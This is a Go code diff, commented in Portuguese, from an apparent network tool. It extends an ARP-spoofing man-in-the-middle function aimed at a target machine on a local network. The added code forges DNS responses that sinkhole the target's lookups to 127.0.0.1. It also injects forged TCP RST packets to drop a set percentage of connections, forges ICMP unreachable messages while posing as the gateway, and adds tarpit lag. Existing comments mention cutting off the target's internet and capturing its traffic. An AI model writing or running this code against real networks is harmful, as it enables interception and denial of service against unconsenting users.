@@ -11,6 +11,7 @@ import (
 	"sync/atomic"
 	"time"
 	"bytes"
+	"math/rand"
 
 	"github.com/gabrifranca/cli_ping/internal/report"
 
@@ -456,7 +457,7 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 // a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
 // O parâmetro showLogs controla a exibição em tempo real dos logs de interceptação no terminal.
 // O parâmetro isBlocked, quando ativo, diz ao sniffer para destruir os pacotes e bloquear a internet do alvo.
-func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool) error {
+func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool) error {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Println("  [-] Erro ao buscar interfaces:", err)
@@ -638,6 +639,58 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 					// Se o bloqueio total (Negar WiFi) estiver ativo, descarta tudo silenciosamente.
 					if isBlocked != nil && isBlocked.Load() {
 						continue
+					}
+
+					// DNS Sinkholing — intercepta consultas DNS e forja respostas apontando para 127.0.0.1
+					if isDNSSinkhole != nil && isDNSSinkhole.Load() {
+						// Verifica se é IPv4 (0x0800) + UDP (protocol 17)
+						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 17 {
+							ihl := int(data[14]&0x0F) * 4
+							udpStart := 14 + ihl
+							if len(data) >= udpStart+4 {
+								dstPort := uint16(data[udpStart+2])<<8 | uint16(data[udpStart+3])
+								if dstPort == 53 {
+									pktCopy := make([]byte, len(data))
+									copy(pktCopy, data)
+									s.forgeDNSResponse(captureHandle, pktCopy, myMAC, targetMAC)
+									continue // Não encaminha a query DNS real
+								}
+							}
+						}
+					}
+
+					// Bloqueio TCP RST (Injeção de RST + Drop baseado em porcentagem)
+					if rstDropPercent != nil {
+						dropPercent := rstDropPercent.Load()
+						if dropPercent > 0 {
+							// Verifica se é pacote TCP (IPv4 + TCP)
+							if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 6 {
+								// Sorteia um número de 0 a 99
+								if rand.Int31n(100) < dropPercent {
+									// Forja e injeta um RST para derrubar a conexão ativamente
+									pktCopy := make([]byte, len(data))
+									copy(pktCopy, data)
+									s.forgeTCPRST(captureHandle, pktCopy, myMAC, targetMAC)
+									continue // Descarta o pacote original
+								}
+							}
+						}
+					}
+
+					// ICMP Destination Unreachable — forja ICMP Type 3 Code 1 como se fosse o Gateway
+					if isICMPUnreachable != nil && isICMPUnreachable.Load() {
+						// Verifica se é pacote TCP ou UDP (IPv4)
+						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && (data[23] == 6 || data[23] == 17) {
+							pktCopy := make([]byte, len(data))
+							copy(pktCopy, data)
+							s.forgeICMPUnreachable(captureHandle, pktCopy, myMAC, targetMAC, gatewayIP)
+							continue // Não encaminha o pacote
+						}
+					}
+
+					// Lag Mode (Tarpit)
+					if isLagged != nil && isLagged.Load() {
+						time.Sleep(100 * time.Millisecond)
 					}
 
 					// Filtrar Echoes: Ignorar pacotes que nós mesmos acabamos de injetar
